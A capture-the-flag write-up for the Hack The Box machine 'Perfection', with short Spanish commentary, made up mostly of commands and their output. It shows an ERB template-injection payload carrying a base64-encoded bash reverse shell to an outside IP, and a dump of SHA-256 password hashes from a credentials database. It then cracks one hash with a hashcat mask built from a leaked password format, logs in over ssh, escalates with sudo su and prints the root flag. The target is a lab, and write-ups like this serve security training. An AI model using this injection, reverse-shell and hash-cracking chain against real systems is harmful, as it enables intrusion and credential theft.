# HTB-Perfection

7 * 7

%0A<%25%3d+7*7+%25>

``` shell
base64 <<< "bash -i >& /dev/tcp/10.10.14.59/11234 0>&1" | sed 's/\+/\%2b/'
```


``` urlencode

test <%=system("echo+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41OS8xMTIzNCAwPiYxCg==+|+base64+-d+|+bash");%>

test%0A<%25%3dsystem("echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC40NC8xMTIzNCAwPiYxCg==
+|+base64+-d+|+bash");%25>
```

``` 
susan@perfection:/$ cat /var/mail/susan
susan@perfection:/$ cat /var/mail/susan

Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student

susan@perfection:/$
susan@perfection:~$ cd Migration
cd Migration
susan@perfection:~/Migration$ ls
ls
pupilpath_credentials.db
susan@perfection:~/Migration$ strings pupilpath_credentials.db
strings pupilpath_credentials.db
SQLite format 3
tableusersusers
CREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
Stephen Locke154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8S
David Lawrenceff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87aP
Harry Tylerd33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O
Tina Smithdd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q
Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
susan@perfection:~/Migration$ 


hashcat -m 1400 hash -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a3019934...39023f
Time.Started.....: Thu Apr 11 05:45:50 2024 (8 mins, 9 secs)
Time.Estimated...: Thu Apr 11 05:53:59 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: susan_nasus_?d?d?d?d?d?d?d?d?d [21]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   711.7 kH/s (0.94ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 324557824/1000000000 (32.46%)
Rejected.........: 0/324557824 (0.00%)
Restore.Point....: 324556800/1000000000 (32.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: susan_nasus_126824210 -> susan_nasus_903759210
Hardware.Mon.#1..: Util: 85%

Started: Thu Apr 11 05:45:18 2024
Stopped: Thu Apr 11 05:54:00 2024
                                                                                                   
┌──(kali㉿kali)-[~]
└─$ hashcat -m 1400 hash -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d --show
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
```
Una vez tenemos la passwd nos conectamos via ssh 
ssh susan@10.10.11.253

con contraseña: susan_nasus_413759210

hacemos sudo su y ya somos root

```
susan@perfection:~$ sudo su
root@perfection:/home/susan# ls
Migration  ruby_app  user.txt
root@perfection:/home/susan# cd /root
root@perfection:~# ls
root.txt
root@perfection:~# cat root.txt
ba66a992471f76716105844ddeeeb5a4
root@perfection:~# 
```

